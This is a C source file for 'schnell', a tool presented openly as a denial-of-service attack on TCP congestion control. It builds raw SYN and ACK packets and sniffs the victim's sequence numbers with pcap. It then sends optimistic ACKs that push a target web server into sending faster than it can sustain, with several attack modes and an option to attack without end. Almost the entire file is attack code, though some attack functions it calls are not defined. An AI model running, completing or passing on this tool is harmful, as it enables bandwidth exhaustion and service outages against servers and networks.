/* SCHNELL!   DoS attack against tcp congestion control
 * 	- capveg '03 - do not distribute!
 *
 * 	usage: ./schnell [-s us] [-mss N] http://www.someplace.com/bigfile
 */


#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <limits.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <errno.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
#include <assert.h>
#include <unistd.h>
#include <pthread.h>
#include <ifaddrs.h>

#include "schnell.h"


#ifndef MSG_DONTWAIT
// horrible compatibility hack
#define MSG_DONTWAIT 0
#endif

char victimFQHN[BUFLEN] = "";
char localFQHN[BUFLEN] = "";
unsigned short victimPort = 0;
unsigned short localPort;
unsigned int victimIP;
unsigned int localIP;
char URL[BUFLEN]="";
int MSS = 536;
char * EtherDev =  "h1-eth0";
volatile unsigned int victimSequence;
unsigned int localSequence;
int AttackType=7;
pcap_t * PcapHandle=NULL;
int gotFINorRST =0;
int Verbose=0;
int LoopInfinitely=0;
unsigned int Window = 65;//5840;
unsigned long usRTT = 1000; 	// 1ms ; since we are streaming data, we can pick
				// an arbitrary usRTT to emulate
unsigned long delayedAckTO=1000;	// time between acks when	in microS
					// not in slow start
unsigned long TargetBandwidth=10*1000*1000;	// in bytes/second
struct timeval StartTime;
int FileSize=100*1024*1024;

pthread_mutex_t PacketLock;
pthread_cond_t PacketCond;
unsigned char WSCALE = 14;


int main(int argc, char * argv[]){

	int rawSock;
	char buf[BUFLEN];


	parseArgs(argc,argv);	// will exit if error
	srand(time(NULL));
	localIP = getLocalIP();
	rawSock = socket(PF_INET, SOCK_RAW,IPPROTO_TCP); // tcp
	if(rawSock == -1 ){
		perror("ERR: socket");
		return rawSock;
	}
	do {
		printf("Attacking %s[%s:%x] on port %u : %s",
				victimFQHN,
				inet_ntop(AF_INET,&victimIP,buf,BUFLEN),htonl(victimIP),
				victimPort,
				URL);
		localPort = (rand()%(65536-1024))+1024;	// random high port
		localSequence = rand();
		printf(" from %s:%u [%s:%x]; localSeq=%u\n",
				localFQHN,localPort,
				inet_ntop(AF_INET,&localIP,buf,BUFLEN),htonl(localIP),
				 localSequence);
        fflush(stdout);
		if(PcapHandle)
			free(PcapHandle);
		PcapHandle = init_pcap();
		switch(AttackType){
			case 0: do_schnell_attack(rawSock);
				break;
			case 1: do_fast_resend_attack(rawSock);
				break;
			case 2: do_schnell2_attack(rawSock);
				break;
			case 3: do_schnell3_attack(rawSock);
				break;
			case 4: do_schnell4_attack(rawSock);
				break;
			case 5: do_schnell5_attack(rawSock);
				break;
			case 6: do_schnell6_attack(rawSock);
				break;
			case 7: do_schnell7_attack(rawSock);
				break;
			case 8: do_schnell8_attack(rawSock);
				break;
			case 9: do_schnell9_attack(rawSock);
				break;
			default:
				fprintf(stderr,"Unknown attack type %d\n",AttackType);
				return -1;
		}
	}while(LoopInfinitely);

	return 0;
}
/* do_schnell2_attack(rawSock):
 * 	runs the schnell attack, but spawns a thread to read incoming packets
 * 	and attempts to do intelligent delayed ACK responses
 *
 * 	[1] If we don't get a packet in the GTO period, ACK *half* of what
 * 	we were expecting...
 */
int do_schnell2_attack(rawSock){
	int retries;
	pthread_t grabberThread;
	struct timespec ts;
	struct timeval tv,lastACK;
	int err;
	int timedout;
	int delayedACK=0;
	int inSlowStart =1 ;	// are we in slow start or not
	int nSegments=1;		// the number of segments in our window
	unsigned long GTO=1000;	// Get TimeOut, should be a fraction of RTO, in microS

	pthread_mutex_init(&PacketLock,NULL);
	pthread_cond_init(&PacketCond,NULL);

	do {
		sendSYN(rawSock);
		retries++;
	} while( getSYNACK(rawSock) && (retries < 10));
	if(retries>=10){
		fprintf(stderr,"Never Got SYNACK :(\n");
		exit(1);
	}
	victimSequence++;
	localSequence++;
	sendACK(rawSock);
	gettimeofday(&lastACK,NULL);
	sendHTMLGET(rawSock);	// send "GET URL\r\n" to server
	err=pthread_create(&grabberThread,NULL,packetGrabber2,NULL);
	if(err){
		perror("ERR: pthread_create");
		exit(5);
	}

	pthread_mutex_lock(&PacketLock);	// we are locked when ever we are in the loop
	do{
		printf("%10u : %d DA=%d %s  ",victimSequence, nSegments,delayedACK, inSlowStart?"Slow Start":"CongestionA");
		Window = MIN(65535,(nSegments+2)*MSS*2);

		gettimeofday(&tv,NULL);
		ts.tv_sec = tv.tv_sec;
		ts.tv_nsec=(tv.tv_usec+GTO)*1000;
		err=pthread_cond_timedwait(&PacketCond,&PacketLock,&ts);
		timedout = (err == ETIMEDOUT);
		if(err && (!timedout))
			perror("ERR: pthread_cond_timedwait");
		if(timedout){
			if(delayedACK){	//
				delayedACK=0;	// if we delayed an ACK, send it now
				printf(" timeout: delayed ACK sent\n");
			}else{
				// else make it up
				victimSequence+=MIN((nSegments/2),1)*MSS;	// inc by half window size[1]
				printf(" timeout\n");
			}
			sendACK(rawSock);
			gettimeofday(&lastACK,NULL);
			continue;
		}
		if(inSlowStart){
			nSegments++;
			if((nSegments*MSS)>65535)
				inSlowStart=0;		// into congestion avoidance
			sendACK(rawSock);
			gettimeofday(&lastACK,NULL);
			printf(" send SS packet\n");
			continue;
		}
		// send ACK if we haven't in a while
		gettimeofday(&tv,NULL);
		if((tv.tv_sec*1000000+tv.tv_usec
				-lastACK.tv_sec*1000000-lastACK.tv_usec)<delayedAckTO){
			delayedACK=1;	// delay the ACK
			printf(" delayed ACK\n");
			continue;
		}
		sendACK(rawSock);	// else really send the ACK
		gettimeofday(&lastACK,NULL);
		delayedACK=0;
		printf(" ACK SENT\n");
	}while(!gotFINorRST);

	return 0;
}


static unsigned int window;
void* packetGrabber0(void *arg) {
	struct tcphdr *tcph;
	const unsigned char * packet;
	struct pcap_pkthdr pcap_hdr;
    unsigned int vseq = 0;
	int rawSock;

	rawSock=*(int *)arg;
	while(1){
		packet = pcap_next(PcapHandle,&pcap_hdr);
		if(packet==NULL)
			continue;
		tcph = (struct tcphdr*) (packet + 34);  // 14 + 20 = ethernet + ip hdrs
		if(tcph->fin||tcph->rst)
			gotFINorRST=1;

        unsigned int new_vseq = ntohl(tcph->seq);
        if (new_vseq <= vseq) {
          victimSequence = new_vseq;
          window = MSS;
          printf("updating victim seqno...\n");
        }
        vseq = new_vseq;
        printf("victim seqno: %ud\n", victimSequence);
        fflush(stdout);
	}
	return NULL;
}



int do_schnell_attack(int rawSock){
	int retries =0;
	struct tcphdr *tcph;
	const unsigned char * packet;
	struct pcap_pkthdr pcap_hdr;
    long usSendDelay = 1000000*(double)54/LocalBandwidth;	// how many microsecs between ACKs

	do {
		sendSYN(rawSock);
		retries++;
	} while( getSYNACK(rawSock) && (retries < 10));
	/*
	if(pcap_setnonblock(PcapHandle,1,errbuf)==-1){	// set the pcap handle to non-blocking
		fprintf(stderr,"pcap_setnonblock:: %s\n",errbuf);
		exit(2);
	}
	*/
	victimSequence++;
	localSequence++;
	sendACK(rawSock);
	sendHTMLGET(rawSock);	// send "GET URL\r\n" to server

	printf("Doing LAZY attack (schnell1)\n");

	/* Main loop */

    pthread_t grabber;
    pthread_create(&grabber,NULL,packetGrabber0,&rawSock);
	while(1){
      myusSleep(usSendDelay);
      if(gotFINorRST){
        printf("GOT FIN or RST... exiting\n");
        break;
      }
      sendACK(rawSock);
      victimSequence += window;
      window += MSS;
	}

	/* 	packet = pcap_next(PcapHandle,&pcap_hdr); */
	/* 	if(!packet) */
	/* 		continue; */
	/* 	tcph = (struct tcphdr*) (packet + 34); */
	/* 	victimSequence = ntohl(tcph->seq); */
	/* 	sendACK(rawSock); */
	/* 	if(tcph->fin||tcph->rst) */
	/* 		break; */
	/* } */

	return 0;
}


int do_fast_resend_attack(int rawSock){
	int retries=0;

	do {
		sendSYN(rawSock);
		retries++;
	} while( getSYNACK(rawSock) && (retries < 10));

	victimSequence++;
	localSequence++;
	sendACK(rawSock);
	sendHTMLGET(rawSock);	// send "GET URL\r\n" to server

	while(!gotFINorRST){
		usleep(1000);
		sendACK(rawSock);
		usleep(1000);
		sendACK(rawSock);
		usleep(1000);
		sendACK(rawSock);
		usleep(1000);
		//victimSequence++;
	}
	return 0;

}
void parseArgs(int argc, char * argv[]){
	struct hostent * h;
	char buf[BUFLEN];
	char * token;
	char * port;
	int i=1;

	if(argc<2)
		usage(NULL,NULL);
	while(argc>2){
		if(!strcmp(argv[i],"-A")){
			AdaptiveDelay=0;
			argc--;
			argv++;
			continue;
		}
		if(!strcmp(argv[i],"-l")){
			LoopInfinitely=1;
			argc--;
			argv++;
			continue;
		}
		if(!strcmp(argv[i],"-L")){
			if(argc<=i)
				usage("Not enough args for -L",NULL);
			LocalBandwidth= atol(argv[2]);
			argc-=2;
			argv+=2;
			continue;
		}
		if(!strcmp(argv[i],"-w")){
			if(argc<=i)
				usage("Not enough args for -w",NULL);
			WSCALE= atoi(argv[2]);
			argc-=2;
			argv+=2;
			continue;
		}
		if(!strcmp(argv[i],"-m")){
			if(argc<=i)
				usage("Not enough args for -m",NULL);
			MSS= atoi(argv[2]);
			argc-=2;
			argv+=2;
			continue;
		}
		if(!strcmp(argv[i],"-d")){
			if(argc<=i)
				usage("Not enough args for -d",NULL);
			DelayIncrement= atoi(argv[2]);
			argc-=2;
			argv+=2;
			continue;
		}
		if(!strcmp(argv[i],"-r")){
			if(argc<=i)
				usage("Not enough args for -r",NULL);
			usRTT= atoi(argv[2]);
			argc-=2;
			argv+=2;
			continue;
		}
		if(!strcmp(argv[i],"-v")){
			Verbose=1;
			argc--;
			argv++;
			continue;
		}
		if(!strcmp(argv[i],"-e")){
			if(argc<=i)
				usage("Not enough args for -e",NULL);
			Efficency= atof(argv[2]);
			argc-=2;
			argv+=2;
			continue;
		}
		if(!strcmp(argv[i],"-t")){
			if(argc<=i)
				usage("Not enough args for -t",NULL);
			TargetBandwidth= atol(argv[2]);
			argc-=2;
			argv+=2;
			continue;
		}
		if(!strcmp(argv[i],"-n")){
			if(argc<=i)
				usage("Not enough args for -n",NULL);
			MaxNoise= atof(argv[2]);
			argc-=2;
			argv+=2;
			continue;
		}
		if(!strcmp(argv[i],"-1")){
			AttackType=0;
			argc--;
			argv++;
			continue;
		}
		if(!strcmp(argv[i],"-R")){
			AttackType=1;
			argc--;
			argv++;
			continue;
		}
		if(!strcmp(argv[i],"-2")){
			AttackType=2;
			argc--;
			argv++;
			continue;
		}
		if(!strcmp(argv[i],"-3")){
			AttackType=3;
			argc--;
			argv++;
			continue;
		}
		if(!strcmp(argv[i],"-4")){
			AttackType=4;
			argc--;
			argv++;
			continue;
		}
		if(!strcmp(argv[i],"-5")){
			AttackType=5;
			argc--;
			argv++;
			continue;
		}
		if(!strcmp(argv[i],"-6")){
			AttackType=6;
			argc--;
			argv++;
			continue;
		}
		if(!strcmp(argv[i],"-7")){
			AttackType=7;
			argc--;
			argv++;
			continue;
		}
		if(!strcmp(argv[i],"-8")){
			AttackType=8;
			argc--;
			argv++;
			continue;
		}
		if(!strcmp(argv[i],"-9")){
			AttackType=9;
			argc--;
			argv++;
			continue;
		}
		if(!strncmp(argv[i],"-",strlen("-"))){
			usage("bad arg",argv[i]);
		}
		/* add other arg parsing HERE */
	}


	strncpy(URL,argv[1],BUFLEN);
	strncpy(buf,argv[1],BUFLEN);	// tmp buf, for strtok
	token= strtok(buf,":");	// non-reentrant one is okay, b/c single thread
	if(!token || strcmp(token,"http"))
		usage("url must start with http://.../, got: ",token);
	token = strtok(NULL,"/");
	if(!token || !strcmp(token,""))
		usage("Malformed url at pass 3:",token);
	port = index(token,':');
	if(port){
		*port = 0;
		port++;
		victimPort = atoi(port);
	} else {
		victimPort = 80;
	}
	strncpy(victimFQHN,token,BUFLEN);
	h = gethostbyname(victimFQHN);
	if(h == NULL){
		fprintf(stderr,"Host %s not found\n",victimFQHN);
		exit(2) ;
	}
	memcpy((char *) &victimIP,h->h_addr,h->h_length);
	strncpy(victimFQHN,h->h_name,BUFLEN);
}


int sendSYN(int sock){
	int err;
	struct tcphdr *tcp;
	struct pseudohdr * pseudo;
	u8  packet[2048];
	struct sockaddr_in sin;
	int packetsize;
	u8 * options;

	pseudo = (struct pseudohdr *) packet;
	packetsize=sizeof(struct tcphdr)+8;	// 4 bytes of options
	assert((packetsize%4)==0);		// packetsize MUST be multiple of 4
	memset(pseudo,0, sizeof(struct pseudohdr));
	pseudo->s_addr =localIP;
	pseudo->d_addr = victimIP;
	pseudo->zero = 0;
	pseudo->proto = IPPROTO_TCP;
	pseudo->length = htons(packetsize);
	tcp = (struct tcphdr *) (packet + sizeof(pseudohdr));
	memset(tcp,0,sizeof(struct tcphdr));
	tcp->source = htons(localPort);
	tcp->dest = htons(victimPort);
	tcp->seq = htonl(localSequence);
	tcp->doff = packetsize/4; 		// no byte conversion; single byte
	tcp->syn = 1;
	tcp->window = htons(Window);	// default window
	options = (u8 *) ((u8*)tcp+sizeof(struct tcphdr));
	options[0] = 2;		// MSS KIND
	options[1] = 4;		// MSS length
	*(short *)&options[2] = htons(MSS);	// set MSS
	options[4] = 3;		// WSCALE kind
	options[5] = 3;		// WSCALE length
	options[6] = WSCALE;
	options[7] = 1;		// NOOP


	tcp->check = in_cksum((unsigned short *) packet,
			packetsize+sizeof(struct pseudohdr));
	printf("Tcp checksum: %u\n",tcp->check);
	sin.sin_addr.s_addr = victimIP;
	sin.sin_port = IPPROTO_TCP;
	sin.sin_family = AF_INET;

    printf("pseudo hdr (size: %d): ", sizeof(unsigned long));
    int i;
    for (i = 0; i < sizeof(struct pseudohdr); i++) {
      printf("%02X", ((u_int8_t *)pseudo)[i]);
    }
    printf("\n");
    printf("tcp packet: ");
    for (i = 0; i < packetsize; i++) {
      printf("%02X", ((u_int8_t *)tcp)[i]);
    }
    printf("\n");

	/* int  sendto(int  s, const void *msg, size_t len, int flags, const struct sock­
	 *        addr *to, socklen_t tolen);
	 */

	err = sendto(sock, tcp, packetsize,
			MSG_DONTWAIT, (struct sockaddr *)& sin, sizeof(sin));
	if(err<packetsize){
		perror("ERR: sendSYN: sento");
		return err;
	}

	return 0;
}

int getSYNACK(int sock){
	const unsigned char * packet;
	struct pcap_pkthdr phdr;
	struct tcphdr *tcph;
	struct iphdr * iph;

	assert(PcapHandle);

	packet = pcap_next(PcapHandle, &phdr);
	if(!packet)
		return 1;
	packet+=14;		// we are hard coded for ethernet

	iph = (struct iphdr *) packet;
	assert(iph->version==4);
	printf("Got packet: size=%d,ipv=%d,ihl=%d\n",
			phdr.len, iph->version, iph->ihl);
	tcph = (struct tcphdr *) ((char*)iph + iph->ihl*4);	// grab start of tcp from ip header
	victimSequence = ntohl(tcph->seq);
	printf("Got SYNACK; ISN=%u (0x%x) - %u : %p : %p\n",victimSequence,victimSequence,
			(void *)tcph - (void *)iph,
			tcph,iph);
	return 0;
}


unsigned int getLocalIP(){
	struct hostent h, *hptr;
	char tmpbuf[BUFLEN];
	int err;
	unsigned int ret;

	/* assert(!gethostname(localFQHN,BUFLEN)); */
	/* gethostbyname_r(localFQHN, &h, tmpbuf, BUFLEN, &hptr, &err); */
	/* assert(hptr != NULL); */
	/* memcpy(&ret, hptr->h_addr, sizeof(ret)); */

    struct ifaddrs *ifAddrStruct, *ifa;
	getifaddrs(&ifAddrStruct);

	for (ifa = ifAddrStruct; ifa != NULL; ifa = ifa->ifa_next) {
	  if (ifa->ifa_addr->sa_family == AF_INET &&
	      strstr(ifa->ifa_name,"eth0")) {
	    strncpy(localFQHN,ifa->ifa_name,BUFLEN);
	    localFQHN[BUFLEN-1]=0;
	    memcpy(&ret, &((struct sockaddr_in *)ifa->ifa_addr)->sin_addr,
		   sizeof(ret));
	    break;
	  }
	}

	return ret;
}

/* Standard BSD internet checksum routine  -- snagged from nmap*/
unsigned short in_cksum(u16 *ptr,int nbytes) {

	register u32 sum;
	u16 oddbyte;
	register u16 answer;

	/*
	for(i=0;i<nbytes/2;i++)
		printf("%d: 0x%.4X : %u : %u\n",i,ptr[i], ptr[i], ntohs(ptr[i]));
		*/

	/*
	 *  * Our algorithm is simple, using a 32-bit accumulator (sum),
	 *   * we add sequential 16-bit words to it, and at the end, fold back
	 *    * all the carry bits from the top 16 bits into the lower 16 bits.
	 *     */

	sum = 0;
	while (nbytes > 1)  {
		sum += *ptr++;
		nbytes -= 2;
	}

	/* mop up an odd byte, if necessary */
	if (nbytes == 1) {
		oddbyte = 0;            /* make sure top half is zero */
		*((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */
		sum += oddbyte;
	}

	/*
	 *  * Add back carry outs from top 16 bits to low 16 bits.
	 *   */
	while (sum>>16)
           sum = (sum & 0xffff) + (sum >> 16);
	answer = ~sum;          /* ones-complement, then truncate to 16 bits */
	return(answer);
}


void usage(char * s1, char *s2){

	if(s1)
		fprintf(stderr,"%s",s1);
	if(s2)
		fprintf(stderr," %s",s2);
	if(s1||s2)
		fprintf(stderr,"\n");

	fprintf(stderr,"Usage\n"
			"\tschnell <options> http://someplace[:port]/file\n"
			"\nOptions:\n"
			"	-v 	: verbose (off)\n"
			"	-d us   : delay increment for adaptive delay [%lu]\n"
			"	-r us	: fake RTT (micro second) [%lu]\n"
			"       -t bytes: target bandwidth [%lu]\n"
			"       -L bytes: local bandwidth [%lu]\n"
			" 	-A 	: turn adaptive delays off [on]\n"
			" 	-m mss 	: sets the MSS in bytes [%d]\n"
			" 	-w s	: sets the WSCALE option to s [%d]\n"
			"       -n x: Max Noise around the RTT [%f]\n"
			"       -e x: Efficency Percent of full window to ACK [%f]\n"
			" 	-l : attack indefinitely, restarting as necs [off]\n"
			" 	-R :	Fast Resend Attack \n"
			"	-1 :	schnell LAZY attack \n"
			"	-2 :	schnell2 attack\n"
			"	-3 :	schnell3 attack\n"
			"	-4 :	schnell4 attack \n"
			"	-5 :	schnell5 attack \n"
			"	-6 :	schnell6 attack\n"
			"	-7 :	schnell7 attack(default) \n"
			"	-8 :	schnell8 attack \n"
			"	-9 :	schnell9 attack \n",
			DelayIncrement,
			usRTT,
			TargetBandwidth, LocalBandwidth,MSS, WSCALE,MaxNoise, Efficency);
	exit(1);
}


pcap_t * init_pcap(){
	char errbuf[PCAP_ERRBUF_SIZE];
	char * dev;
	pcap_t *handle;
	struct bpf_program filter;
	bpf_u_int32 mask=0, net=0;
	char filterstr[BUFLEN];
	char tmpbuf[BUFLEN];
	char tmpbuf2[BUFLEN];


	dev = EtherDev;
	if(!dev)
		dev = pcap_lookupdev(errbuf);
	if(!dev){
		fprintf(stderr,"ER: pcap_lookupdev: %s\n",errbuf);
		exit(1);
	}

	if(pcap_lookupnet(dev,&net,&mask,errbuf) == -1){
		fprintf(stderr,"ER: pcap_lookupnet: %s; ",errbuf);
		exit(1);
	}
	fprintf(stderr,"Listening on Device: %s\n", dev);

	handle = pcap_open_live(dev, MYSNAPLEN, 1, 0, errbuf);
	if(!handle){
		fprintf(stderr,"ER: pcap_open_live: %s\n",errbuf);
		exit(3);
	}
	snprintf(filterstr,BUFLEN,"src host %s and src port %u and dst host %s and dst port %u",
			inet_ntop(AF_INET,&victimIP,tmpbuf,BUFLEN),
			victimPort,
			inet_ntop(AF_INET,&localIP,tmpbuf2,BUFLEN),
			localPort);
	printf("pcap filter: using %s\n",filterstr);
	if(pcap_compile(handle,&filter,filterstr,1,net)==-1){
		fprintf(stderr,"ER: pcap_compile: %s\n",errbuf);
		exit(4);
	}

	if(pcap_setfilter(handle,&filter ) == -1){
		fprintf(stderr,"ER: pcap_setfilter: %s\n",errbuf);
		exit(5);
	}

	assert(pcap_datalink(handle)==DLT_EN10MB);	// useless non-ethernet people

	return handle;
}

int sendACK(int sock){
	return ACK(sock,victimSequence);
}

int ACK(int sock, unsigned int seq){
	static int flag=1;
        int err;
        struct tcphdr *tcp;
        struct pseudohdr * pseudo;
        u8 packet[2048];
        struct sockaddr_in sin;
	struct timeval now;

	if(flag){
		printf("Getting start time...\n");
		gettimeofday(&StartTime,NULL);
		flag=0;
	}

        pseudo = (struct pseudohdr *) packet;
        memset(pseudo,0, sizeof(struct pseudohdr));
        pseudo->s_addr =localIP;
        pseudo->d_addr = victimIP;
        pseudo->zero = 0;
        pseudo->proto = IPPROTO_TCP;
        pseudo->length = htons(sizeof(struct tcphdr));
        tcp = (struct tcphdr *) (packet + sizeof(pseudohdr));
        memset(tcp,0,sizeof(struct tcphdr));
        tcp->source = htons(localPort);
        tcp->dest = htons(victimPort);
        tcp->seq = htonl(localSequence);
	tcp->ack_seq = htonl(seq);
        tcp->doff = 5; // figure out options size
        tcp->ack = 1;
        //printf("window: %d\n", Window);
        tcp->window = htons(Window);      // default window




        tcp->check = in_cksum((unsigned short *) packet,
                        sizeof(struct tcphdr)+sizeof(struct pseudohdr));
        sin.sin_addr.s_addr = victimIP;
        sin.sin_port = IPPROTO_TCP;
        sin.sin_family = AF_INET;

        /* int  sendto(int  s, const void *msg, size_t len, int flags, const struct sock
         *        addr *to, socklen_t tolen);
         */

        err = sendto(sock, tcp, sizeof(struct tcphdr),
                        0, (struct sockaddr *)& sin, sizeof(sin));
        if(err<sizeof(struct tcphdr)){
                perror("ERR: sendSYN: sento");
                return err;
        }

	gettimeofday(&now,NULL);
	now.tv_sec=now.tv_sec-StartTime.tv_sec;
	now.tv_usec=now.tv_usec-StartTime.tv_usec;
	if(now.tv_usec<0){
		now.tv_sec--;
		now.tv_usec+=1000000;
	}
	if(Verbose)
		printf("ACK: %ld.%.6ld %u\n",now.tv_sec,now.tv_usec,seq);
        return 0;
}


int sendHTMLGET(int sock){
        int err;
        struct tcphdr *tcp;
        struct pseudohdr * pseudo;
        u8 packet[2048];
        struct sockaddr_in sin;
	char data[BUFLEN];
	int count;
	int offset;

	count = snprintf(data,BUFLEN,"GET /big HTTP/1.1\r\nHost: localhost:%d\r\nAccept: */*\r\n\r\n", victimPort);

        pseudo = (struct pseudohdr *) packet;
        memset(pseudo,0, sizeof(struct pseudohdr));
        pseudo->s_addr =localIP;
        pseudo->d_addr = victimIP;
        pseudo->zero = 0;
        pseudo->proto = IPPROTO_TCP;
        pseudo->length = htons(sizeof(struct tcphdr)+count);
        tcp = (struct tcphdr *) (packet + sizeof(pseudohdr));
        memset(tcp,0,sizeof(struct tcphdr));
        tcp->source = htons(localPort);
        tcp->dest = htons(victimPort);
        tcp->seq = htonl(localSequence);
	tcp->ack_seq = htonl(victimSequence);
        tcp->doff = 5; // figure out options size
        tcp->ack = 1;
	tcp->psh= 1;
        tcp->window = htons(Window);      // default window


	offset = sizeof(struct tcphdr)+sizeof(struct pseudohdr);
	memcpy(packet + offset, data,count);	// put the data into place
        tcp->check = in_cksum((unsigned short *) packet,offset+count);
        sin.sin_addr.s_addr = victimIP;
        sin.sin_port = IPPROTO_TCP;
        sin.sin_family = AF_INET;

        /* int  sendto(int  s, const void *msg, size_t len, int flags, const struct sock
         *        addr *to, socklen_t tolen);
         */

        err = sendto(sock, tcp, sizeof(struct tcphdr)+count,
                        0, (struct sockaddr *)& sin, sizeof(sin));
        if(err<sizeof(struct tcphdr)){
                perror("ERR: sendSYN: sento");
                return err;
        }

	localSequence+=count+1;
        return 0;
}

/* void packetHandler(unsigned char *user, const struct pcap_pkthdr * pcap_hdr,
 *               const unsigned char * packet);
 *      packet handler; get a packet, stip the SEQ number out
 *      and put it in victimSequence
 *      if the FIN or RST flags are set, set gotFINorRST=1
 *
 */

void packetHandler(unsigned char *user, const struct pcap_pkthdr * pcap_hdr,
		const unsigned char * packet){
	struct tcphdr *tcph;
	if(pcap_hdr->caplen<54){
		fprintf(stderr,"packetHandler:: got short capture: %d\n",
				pcap_hdr->caplen);
		return;
	}

	// assume its an ethernet packet + ip + tcp, cuz that's all
	// that should get through the filter and the assert()s
	tcph = (struct tcphdr*) (packet + 34);
	victimSequence = ntohl(tcph->seq);
	if(tcph->fin||tcph->rst)
		gotFINorRST=1;
	return;
}

/* void * packetGrabber(void *);
 * 	similar to packetHandler, but multithreaded, with locking
 */

void * packetGrabber2(void *ignore){
	struct tcphdr *tcph;
	const unsigned char * packet;
	struct pcap_pkthdr pcap_hdr;
	ignore=ignore;
	while(1){
		packet = pcap_next(PcapHandle,&pcap_hdr);
		if(packet == NULL){
			fprintf(stderr,"pcap_next: err\n");
			continue;
		}
		tcph = (struct tcphdr*) (packet + 34);
		pthread_mutex_lock(&PacketLock);
		victimSequence = ntohl(tcph->seq);
		if(tcph->fin||tcph->rst)
			gotFINorRST=1;
		pthread_cond_signal(&PacketCond);
		pthread_mutex_unlock(&PacketLock);
	}
	return NULL;
}


/* int mymsSleep(int ms);
 * 	look at nanosleep(2); if the process is scheduled as SCHED_FIFO or SCHED_RR,
 * 	then we can get ms accuracy when we call nanosleep() with a values < 2ms.
 * 	So, I implement this as multiple calls to nanosleep(), but that might be horrible
 *
 * 	SCRATCH THAT - this causes weirdness, so just busy loop until we are done
 */
int myusSleep(int us){
	struct timeval now;
	struct timeval then;
	long elapsed;
//	struct timespec sleep;
//	sleep.tv_sec=0;
//	sleep.tv_nsec=1000000;	// 1 ms
	gettimeofday(&then,NULL);
	do{
//		nanosleep(&sleep,NULL);	// sleep 1 ms
		gettimeofday(&now,NULL);
		elapsed = 1000000*(now.tv_sec-then.tv_sec) +now.tv_usec-then.tv_usec;
	}while(elapsed<us);
	if(Verbose)
		printf("TIMER: %d %ld %ld.%.6ld %ld.%.6ld\n",
			us,elapsed,now.tv_sec,now.tv_usec,then.tv_sec,then.tv_usec);
	return 0;	// mommy, please make the ugly hack stop
}
